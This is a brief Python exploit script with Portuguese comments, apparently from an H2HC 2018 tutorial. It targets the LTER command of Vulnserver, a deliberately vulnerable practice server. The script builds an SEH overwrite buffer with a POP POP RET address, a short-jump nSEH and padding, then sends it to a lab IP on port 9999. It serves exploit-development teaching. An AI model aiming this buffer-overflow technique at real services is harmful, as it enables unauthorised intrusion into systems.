#!/usr/bin/python
#
# H2HC 2018 - Vulnserver.exe
# Um guia, passo a passo, para explorar o comando LTER.
#

import socket
import os
import sys

# POP POP RET encontrado em 6250120b (essfunc.dll)
seh = "\x0B\x12\x50\x62"

# Pulando 128 bytes (FF se transformar√° em 80)
pulo = "\x4C\x4C\x77\xFF"

# evil = lixo + nSEH + SEH + lixo
evil = "A"*3495 + pulo + seh + "D"*497
data = "LTER /.:/" + evil

expl = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
expl.connect(("10.0.0.35", 9999))
expl.send(data)
expl.close
